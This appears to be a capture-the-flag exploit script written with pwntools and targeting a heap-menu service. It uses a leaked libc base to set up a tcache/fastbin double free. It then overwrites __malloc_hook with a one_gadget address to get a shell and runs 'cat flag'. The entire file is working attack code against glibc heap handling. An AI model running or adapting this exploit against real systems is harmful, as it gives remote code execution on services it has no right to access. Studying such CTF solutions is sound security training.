from pwn import *
import struct

def delete_entry(connection: remote, entry_index: int):
    if not isinstance(connection, remote):
        raise TypeError("Expected a 'remote' instance for 'connection'")
    if not isinstance(entry_index, int):
        raise TypeError("Expected an 'int' for 'entry_index'")
    connection.sendline(b"d")
    connection.sendline(str(entry_index).encode())

def create_entry(connection: remote, entry_name: bytes):
    if not isinstance(connection, remote):
        raise TypeError("Expected a 'remote' instance for 'connection'")
    if not isinstance(entry_name, bytes):
        raise TypeError("Expected a 'bytes' for 'entry_name'")
    connection.sendline(b"g")
    connection.sendline(entry_name)

try:
    connection = remote('10.21.232.3', 20202)
    connection.recvuntil(b'Libc base: ')
    base_address = int(connection.recvline().rstrip(), 16)
    libc = ELF('libc.so.6')
    one_gadget_address = base_address + 0x10a2fc

    connection.recvuntil(b'Action: ')
    for _ in range(9):
        create_entry(connection, b"abcd")

    for index in range(7):
        delete_entry(connection, index)

    delete_entry(connection, 7)
    delete_entry(connection, 8)
    delete_entry(connection, 7)

    for _ in range(7):
        create_entry(connection, b"abcd")

    create_entry(connection, p64(libc.sym.__malloc_hook + base_address))
    create_entry(connection, b"AAAA")
    create_entry(connection, b"1234")
    create_entry(connection, p64(one_gadget_address))
    create_entry(connection, b"1234")
    connection.sendline(b"cat flag") # command to be executed in victim
    connection.recvuntil(b'not found\n')
    print('Flag : ', connection.recvline())
finally:
    connection.close()
